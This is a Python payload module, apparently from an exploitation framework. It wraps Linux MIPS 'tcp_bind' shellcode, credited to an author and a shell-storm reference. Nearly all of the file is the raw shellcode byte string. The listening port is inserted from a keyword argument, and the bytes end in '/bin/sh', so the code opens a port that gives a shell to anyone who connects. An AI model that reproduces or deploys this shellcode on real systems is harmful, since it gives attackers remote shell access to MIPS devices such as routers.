from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "vaicebine"
    Shellcode.info["name"] = "LinuxMIPS - tcp_bind shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-81.php",
    ]
    Shellcode.info["size"] = 276

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\xe0\xff\xbd\x27\xfd\xff\x0e\x24\x27\x20\xc0\x01"		
            r"\x27\x28\xc0\x01\xff\xff\x06\x28\x57\x10\x02\x24"	
            r"\x0c\x01\x01\x01\x50\x73\x0f\x24\xff\xff\x50\x30"		
            r"\xef\xff\x0e\x24\x27\x70\xc0\x01"
            + kwargs["lport"] +
            r"\x0d\x24\x04\x68\xcd\x01\xff\xfd\x0e\x24\x27\x70\xc0\x01"		
            r"\x25\x68\xae\x01\xe0\xff\xad\xaf\xe4\xff\xa0\xaf"		
            r"\xe8\xff\xa0\xaf\xec\xff\xa0\xaf\x25\x20\x10\x02"		
            r"\xef\xff\x0e\x24\x27\x30\xc0\x01\xe0\xff\xa5\x23"		
            r"\x49\x10\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24"	
            r"\x25\x20\x10\x02\x01\x01\x05\x24\x4e\x10\x02\x24"		
            r"\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02"		
            r"\xff\xff\x05\x28\xff\xff\x06\x28\x48\x10\x02\x24"
            r"\x0c\x01\x01\x01\x50\x73\x0f\x24\xff\xff\x50\x30"		
            r"\x25\x20\x10\x02\xfd\xff\x0f\x24\x27\x28\xe0\x01"
            r"\xdf\x0f\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24"		
            r"\x25\x20\x10\x02\x01\x01\x05\x28\xdf\x0f\x02\x24"		
            r"\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02"		
            r"\xff\xff\x05\x28\xdf\x0f\x02\x24\x0c\x01\x01\x01"		
            r"\x50\x73\x0f\x24\x50\x73\x06\x24\xff\xff\xd0\x04"		
            r"\x50\x73\x0f\x24\xff\xff\x06\x28\xdb\xff\x0f\x24"		
            r"\x27\x78\xe0\x01\x21\x20\xef\x03\xf0\xff\xa4\xaf"		
            r"\xf4\xff\xa0\xaf\xf0\xff\xa5\x23\xab\x0f\x02\x24"	
            r"\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68"
        ]
